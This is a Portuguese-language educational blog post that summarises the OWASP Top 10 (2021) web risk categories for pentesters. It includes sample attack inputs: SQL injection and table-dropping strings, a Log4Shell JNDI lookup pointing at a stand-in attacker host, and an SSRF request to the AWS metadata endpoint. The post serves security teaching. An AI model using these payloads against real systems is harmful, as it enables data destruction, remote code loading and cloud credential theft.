---
title: "OWASP Top 10 (2021): Mapeando o Terreno do Pentest Web"
description: "Uma análise técnica das 10 categorias mais críticas de riscos em aplicações web segundo a OWASP, com foco em como cada uma se manifesta na prática de pentest e bug bounty."
pubDate: 2026-08-13
category: "Conhecimento"
tags: ["OWASP", "Pentest Web", "Teoria", "AppSec"]
---

O **OWASP Top 10** é o documento de referência que todo Analista de Segurança Ofensiva deve decorar. Ele não é uma lista de vulnerabilidades isoladas, mas de **categorias de risco** — e entender a diferença muda como você aborda um teste de invasão.

## A01: Broken Access Control

A categoria #1 em 2021. Substitui a falta de verificação de autorização por confiança no estado da sessão.

```text
Normal:   GET /api/user/1001/profile  → 200 (próprio usuário)
Ataque:   GET /api/user/1002/profile  → 200 (IDOR!)
```

Sinais clássicos: **IDOR**, falta de checagem server-side após validação no cliente, e manipulação de JWT com `alg: none`.

## A02: Cryptographic Failures

Vazamento de dados sensíveis por criptografia fraca ou ausente. Busque por:

- Transmissão em HTTP puro de credenciais.
- Uso de algoritmos quebrados (MD5, SHA1) para senhas.
- Cifras simétricas com IV fixo.

## A03: Injection

O clássico que nunca sai de moda. SQLi, NoSQLi, Command Injection e LDAP injection. Sempre teste com payloads de escape de contexto:

```sql
' OR '1'='1
"; DROP TABLE users; --
${jndi:ldap://attacker.com/x}
```

## A04: Insecure Design

Nova categoria em 2021. Reconhece que muitas falhas nascem no **planejamento**, não na implementação. Threat Modeling e abuse cases são essenciais aqui.

## A05: Security Misconfiguration

O "erro de configuração" onipresente: diretórios listáveis, headers de segurança ausentes (`CSP`, `HSTS`), serviços padrão expostos.

## A06: Vulnerable & Outdated Components

Dependências desatualizadas com CVEs conhecidas. `npm audit`, `retire.js` e varredura de banners de versão resolvem 80% do trabalho.

## A07: Identification & Authentication Failures

Credenciais quebradas, brute-force sem rate limit, sessões fixas e recuperação de senha frágil.

## A08: Software & Data Integrity Failures

Foco em pipelines CI/CD e desserialização insegura — onde um atacante injeta código em atualizações confiáveis.

## A09: Security Logging & Monitoring Failures

Ausência de logs de auditoria e alertas. Essencial para detectar e prover evidências em um relatório de pentest.

## A10: Server-Side Request Forgery (SSRF)

Promovida ao Top 10 em 2021. O atacante abusa da máquina do servidor para fazer requisições internas:

```http
POST /api/fetch-image HTTP/1.1
url=http://169.254.169.254/latest/meta-data/iam/  # AWS metadata
```

## Conclusão

Dominar essa lista não significa memorizar nomes — significa internalizar **onde e como cada risco aparece** durante um teste real. O melhor pentester não é quem conhece a ferramenta, mas quem entende o fluxo de negócio que a aplicação tenta proteger.
